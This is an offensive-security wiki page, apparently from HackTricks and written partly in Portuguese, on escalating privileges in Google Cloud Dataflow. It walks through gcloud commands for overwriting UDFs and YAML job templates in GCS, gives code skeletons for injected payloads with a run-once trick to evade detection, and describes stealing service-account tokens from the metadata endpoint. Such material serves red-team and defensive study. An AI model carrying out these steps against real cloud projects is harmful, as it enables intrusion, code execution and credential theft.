# GCP - Dataflow Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### `storage.objects.create`, `storage.objects.get`, `storage.objects.update`

Dataflow não valida a integridade de UDFs e dos YAMLs de template de job armazenados no GCS. Com acesso de escrita ao bucket, você pode sobrescrever esses arquivos para injetar código, executar código nos workers, roubar tokens de service account ou alterar o processamento de dados. Tanto jobs de pipeline batch quanto streaming são alvos viáveis para este ataque. Para executar esse ataque em uma pipeline, precisamos substituir UDFs/templates antes do job rodar, durante os primeiros minutos (antes dos workers do job serem criados) ou durante a execução do job antes que novos workers sejam iniciados (devido ao autoscaling).

**Attack vectors:**
- **UDF hijacking:** Python (`.py`) and JS (`.js`) UDFs referenced by pipelines and stored in customer-managed buckets
- **Job template hijacking:** Custom YAML pipeline definitions stored in customer-managed buckets


> [!WARNING]
> **Run-once-per-worker trick:** Dataflow UDFs e callables de template são invocados **por linha/registro**. Sem coordenação, exfiltração ou roubo de tokens seria executado milhares de vezes, causando ruído, limites de taxa e detecção. Use um padrão de **coordenação baseado em arquivo**: verifique se um arquivo marcador (por exemplo, `/tmp/pwnd.txt`) existe no início; se existir, pule o código malicioso; caso contrário, execute o payload e crie o arquivo. Isso garante que o payload seja executado **uma vez por worker**, não por linha.


#### Exploração direta via gcloud CLI

1. Enumere os jobs do Dataflow e localize os caminhos GCS do template/UDF:

<details>

<summary>Liste os jobs e execute describe para obter o caminho do template, staging location e referências de UDF</summary>
```bash
# List jobs (optionally filter by region)
gcloud dataflow jobs list --region=<region>
gcloud dataflow jobs list --project=<PROJECT_ID>

# Describe a job to get template GCS path, staging location, and any UDF/template references
gcloud dataflow jobs describe <JOB_ID> --region=<region> --full --format="yaml"
# Look for: currentState, createTime, jobMetadata, type (JOB_TYPE_STREAMING or JOB_TYPE_BATCH)
# Pipeline options often include: tempLocation, stagingLocation, templateLocation, or flexTemplateGcsPath
```
</details>

2. Baixe o UDF original ou o template de job do GCS:

<details>

<summary>Baixe o arquivo UDF ou o template YAML do bucket</summary>
```bash
# If job references a UDF at gs://bucket/path/to/udf.py
gcloud storage cp gs://<BUCKET>/<PATH>/<udf_file>.py ./udf_original.py

# Or for a YAML job template
gcloud storage cp gs://<BUCKET>/<PATH>/<template>.yaml ./template_original.yaml
```
</details>

3. Edite o arquivo localmente: injete a payload maliciosa (veja os trechos Python UDF ou YAML abaixo) e garanta que o padrão de coordenação run-once seja usado.

4. Reenvie para sobrescrever o arquivo original:

<details>

<summary>Sobrescrever UDF ou template no bucket</summary>
```bash
gcloud storage cp ./udf_injected.py gs://<BUCKET>/<PATH>/<udf_file>.py

# Or for YAML
gcloud storage cp ./template_injected.yaml gs://<BUCKET>/<PATH>/<template>.yaml
```
</details>

5. Aguarde a próxima execução do job, ou (para streaming) acione o autoscaling (por exemplo, inunde a entrada do pipeline) para que novos workers inicializem e baixem o arquivo modificado.

#### Python UDF injection

Se você quiser que o worker exfiltre dados para seu servidor C2, use `urllib.request` e não `requests`. `requests` não está pré-instalado nos classic Dataflow workers.

<details>

<summary>UDF malicioso com coordenação run-once e extração de metadados</summary>
```python
import os
import json
import urllib.request
from datetime import datetime

def _malicious_func():
# File-based coordination: run once per worker.
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return

# malicous code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")

def transform(line):
# Malicous code entry point - runs per line but coordination ensures once per worker
try:
_malicious_func()
except Exception:
pass
# ... original UDF logic follows ...
```
</details>


#### Job template YAML injection

Injete uma etapa `MapToFields` com um callable que usa um arquivo de coordenação. Para pipelines baseados em YAML que suportam `requests`, use-o se o template declarar `dependencies: [requests]`; caso contrário, prefira `urllib.request`.

Adicione a etapa de limpeza (`drop: [malicious_step]`) para que o pipeline ainda escreva dados válidos no destino.

<details>

<summary>Etapa Maliciosa MapToFields e limpeza no YAML do pipeline</summary>
```yaml
- name: MaliciousTransform
type: MapToFields
input: Transform
config:
language: python
fields:
malicious_step:
callable: |
def extract_and_return(row):
import os
import json
from datetime import datetime
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return True
try:
import urllib.request
# malicious code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")
except Exception:
pass
return True
append: true
- name: CleanupTransform
type: MapToFields
input: MaliciousTransform
config:
fields: {}
append: true
drop:
- malicious_step
```
</details>

### Compute Engine access to Dataflow Workers

**Permissões:** `compute.instances.osLogin` or `compute.instances.osAdminLogin` (com `iam.serviceAccounts.actAs` sobre o worker SA), ou `compute.instances.setMetadata` / `compute.projects.setCommonInstanceMetadata` (com `iam.serviceAccounts.actAs`) para injeção de chaves SSH legada

Os Dataflow workers rodam como VMs do Compute Engine. Acesso aos workers via OS Login ou SSH permite ler tokens do SA do endpoint de metadata (`http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`), manipular dados ou executar código arbitrário.

Para detalhes de exploração, veja:
- [GCP - Compute Privesc](gcp-compute-privesc/README.md) — `compute.instances.osLogin`, `compute.instances.osAdminLogin`, `compute.instances.setMetadata`

## Referências

- [Dataflow Rider: How Attackers can Abuse Shadow Resources in Google Cloud Dataflow](https://www.varonis.com/blog/dataflow-rider)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [gcloud dataflow jobs describe](https://cloud.google.com/sdk/gcloud/reference/dataflow/jobs/describe)
- [Apache Beam YAML: User-defined functions](https://beam.apache.org/documentation/sdks/yaml-udf/)
- [Apache Beam YAML Transform Reference](https://beam.apache.org/releases/yamldoc/current/)

{{#include ../../../banners/hacktricks-training.md}}
